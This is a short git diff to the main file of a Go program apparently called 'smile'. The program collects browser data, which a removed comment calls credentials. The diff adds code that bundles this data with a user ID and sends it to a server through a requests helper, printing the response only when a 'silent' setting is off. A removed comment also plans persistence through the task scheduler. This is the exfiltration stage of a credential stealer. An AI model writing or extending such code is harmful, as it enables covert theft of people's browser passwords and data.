@@ -3,9 +3,12 @@ package main
 import (
 	"fmt"
 	"smile/browsers"
+	"smile/config"
+	"smile/requests"
 )
 
 func main() {
+	config.SetConfig();
 
 	Data := []browsers.BrowserConfig{}
 
@@ -16,10 +19,18 @@ func main() {
 	// Data = append(Data, browsers.Opera());
 	// Data = append(Data, browsers.Safari());
 
-	fmt.Println(Data)
+	// store config.USER_ID and Data in object "data"
+	data := map[string]interface{}{
+		"userId": config.USER_ID,
+		"data": Data,
+	}
 
-	// send credentials to server
+	response, err := requests.SendUserData(data)
+	if err != nil {
+		fmt.Println(err)
+	}
 
-	// if status 200 { return } else { add the program to task sceduler }
-
+	if !config.SILENT {
+		fmt.Println(response);
+	}
 }
